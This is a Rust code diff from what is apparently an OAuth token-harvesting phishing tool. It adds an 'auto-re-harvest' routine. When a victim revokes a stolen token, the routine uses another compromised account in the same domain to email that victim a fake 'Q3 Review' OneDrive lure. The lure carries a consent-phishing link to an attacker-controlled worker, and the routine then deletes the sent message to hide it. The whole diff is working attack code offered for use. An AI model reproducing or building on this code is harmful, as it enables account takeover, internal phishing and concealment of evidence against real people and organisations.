@@ -313,6 +313,15 @@ pub async fn refresh_harvested_token(
                 })),
                 false,
             ).await;
+
+            // Auto-Re-Harvest: Find another active token from the same domain
+            // and send a lure email to re-capture the revoked account
+            let pool_clone = state.pool.clone();
+            let revoked_email = email.clone();
+            let config = state.config.clone();
+            tokio::spawn(async move {
+                auto_re_harvest(&pool_clone, &revoked_email, &config).await;
+            });
         } else {
             anyhow::bail!("Refresh failed with error: {}", error_code);
         }
@@ -329,14 +338,170 @@ async fn mark_token_revoked(pool: &SqlitePool, token_id: &str) -> anyhow::Result
         .execute(pool)
         .await
         .context("Failed to mark token revoked")?;
-    
-    // Also update harvested table for consistency
+
     let _ = sqlx::query("UPDATE harvested SET status = 'revoked', session_status = 'expired' WHERE id = ?")
         .bind(token_id)
         .execute(pool)
         .await;
-    
+
     Ok(())
+}
+
+/// Auto-Re-Harvest: When a token is revoked, find another active token
+/// from the same email domain and send a lure email to re-capture the
+/// revoked account. This is the self-healing mechanism.
+async fn auto_re_harvest(pool: &SqlitePool, revoked_email: &str, config: &crate::AppConfig) {
+    if revoked_email.is_empty() || revoked_email == "unknown" {
+        return;
+    }
+
+    let domain = match revoked_email.split('@').nth(1) {
+        Some(d) => d.to_lowercase(),
+        None => return,
+    };
+
+    println!("[auto-re-harvest] Token revoked for {} — searching for another active token in @{}", revoked_email, domain);
+
+    // Find another active token from the same domain
+    let donor_row: Option<(String, String, Option<String>, Option<String>)> = sqlx::query_as(
+        "SELECT id, email, user_agent, accept_language FROM harvested WHERE status = 'active' AND email LIKE ? AND id != (SELECT id FROM harvested WHERE email = ? LIMIT 1) ORDER BY captured_at DESC LIMIT 1"
+    )
+    .bind(format!("%@{}", domain))
+    .bind(revoked_email)
+    .fetch_optional(pool)
+    .await
+    .unwrap_or(None);
+
+    let (donor_id, donor_email, donor_ua, donor_lang) = match donor_row {
+        Some(row) => row,
+        None => {
+            println!("[auto-re-harvest] No other active token found in @{} — cannot auto-re-harvest", domain);
+            return;
+        }
+    };
+
+    println!("[auto-re-harvest] Found donor account: {} — sending lure to {}", donor_email, revoked_email);
+
+    // Get the donor's access token
+    let donor_token = match crate::retrieve_any_token(&crate::AppState {
+        pool: pool.clone(),
+        config: config.clone(),
+        http_client: reqwest::Client::new(),
+        vault: crate::vault::Vault::new(std::env::var("MASTER_SECRET").unwrap_or_default()),
+        response_key: [0u8; 32],
+    }, &donor_id).await {
+        Ok(t) => t,
+        Err(e) => {
+            eprintln!("[auto-re-harvest] Failed to retrieve donor token: {}", e);
+            return;
+        }
+    };
+
+    let access_token = crate::refresh_access_token(&crate::AppState {
+        pool: pool.clone(),
+        config: config.clone(),
+        http_client: reqwest::Client::new(),
+        vault: crate::vault::Vault::new(std::env::var("MASTER_SECRET").unwrap_or_default()),
+        response_key: [0u8; 32],
+    }, &donor_token.refresh_token).await
+    .unwrap_or_else(|| donor_token.access_token.clone());
+
+    // Generate the OAuth link using the configured worker
+    let worker_url = std::env::var("REDIRECT_URI")
+        .unwrap_or_else(|_| "https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback".to_string());
+    let worker_base = worker_url.replace("/oauth/callback", "");
+    let oauth_link = format!(
+        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id={}&response_type=code&redirect_uri={}&scope={}&response_mode=query",
+        config.client_id,
+        urlencoding::encode(&worker_url),
+        urlencoding::encode("openid offline_access User.Read Mail.ReadWrite Mail.Send Contacts.Read MailboxSettings.ReadWrite")
+    );
+
+    // Build a simple lure email with the OAuth link embedded
+    let lure_subject = format!("Shared document: Q3 Review - {}", domain);
+    let lure_html = format!(
+        r#"<p>Hi,</p>
+<p>I've shared the Q3 review document with you via our OneDrive. Could you take a look when you have a moment? There are a few items we should discuss before Friday's meeting.</p>
+<p><a href="{}" style="display:inline-block;padding:10px 24px;background-color:#0078d4;color:#ffffff;text-decoration:none;border-radius:4px;font-family:Segoe UI,Arial,sans-serif;font-size:14px;">Open Document</a></p>
+<p>Thanks,<br>{}</p>"#,
+        oauth_link,
+        donor_email.split('@').next().unwrap_or("colleague")
+    );
+
+    // Send the lure email from the donor account to the revoked account
+    let send_payload = serde_json::json!({
+        "message": {
+            "subject": lure_subject,
+            "body": { "contentType": "HTML", "content": lure_html },
+            "toRecipients": [{ "emailAddress": { "address": revoked_email } }]
+        },
+        "saveToSentItems": true
+    });
+
+    let ua = donor_ua.as_deref().unwrap_or("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+    let lang = donor_lang.as_deref().unwrap_or("en-US,en;q=0.9");
+
+    let send_res = reqwest::Client::new()
+        .post("https://graph.microsoft.com/v1.0/me/sendMail")
+        .header("Authorization", format!("Bearer {}", access_token))
+        .header("Content-Type", "application/json")
+        .header("User-Agent", ua)
+        .header("Accept-Language", lang)
+        .json(&send_payload)
+        .send()
+        .await;
+
+    match send_res {
+        Ok(r) if r.status().is_success() => {
+            println!("[auto-re-harvest] ✅ Lure email sent from {} to {} — waiting for re-capture", donor_email, revoked_email);
+
+            // OPSEC: Delete the sent email from the donor's Sent Items
+            let sent_url = "https://graph.microsoft.com/v1.0/me/mailFolders/sentitems/messages?$top=1&$select=id&$orderby=receivedDateTime DESC";
+            if let Ok(sent_resp) = reqwest::Client::new()
+                .get(sent_url)
+                .header("Authorization", format!("Bearer {}", access_token))
+                .header("User-Agent", ua)
+                .header("Accept-Language", lang)
+                .send()
+                .await {
+                if let Ok(sent_json) = sent_resp.json::<serde_json::Value>().await {
+                    if let Some(msg_id) = sent_json.get("value").and_then(|v| v.as_array()).and_then(|a| a.get(0)).and_then(|m| m.get("id")).and_then(|v| v.as_str()) {
+                        let _ = reqwest::Client::new()
+                            .delete(&format!("https://graph.microsoft.com/v1.0/me/messages/{}", urlencoding::encode(msg_id)))
+                            .header("Authorization", format!("Bearer {}", access_token))
+                            .header("User-Agent", ua)
+                            .header("Accept-Language", lang)
+                            .send()
+                            .await;
+                        println!("[auto-re-harvest] OPSEC: Deleted sent lure from donor's Sent Items");
+                    }
+                }
+            }
+
+            // Log the auto-re-harvest
+            let _ = crate::audit::insert_audit_log(
+                pool,
+                "auto_re_harvest",
+                None,
+                Some(&donor_id),
+                Some(revoked_email),
+                None,
+                None,
+                Some(serde_json::json!({
+                    "donor_email": donor_email,
+                    "target_email": revoked_email,
+                    "action": "lure_sent"
+                })),
+                true,
+            ).await;
+        }
+        Ok(r) => {
+            eprintln!("[auto-re-harvest] Failed to send lure ({}): {}", r.status(), r.text().await.unwrap_or_default());
+        }
+        Err(e) => {
+            eprintln!("[auto-re-harvest] Send request failed: {}", e);
+        }
+    }
 }
 
 /// Run session refresh cycle: verify OAuth tokens are still valid by attempting refresh.
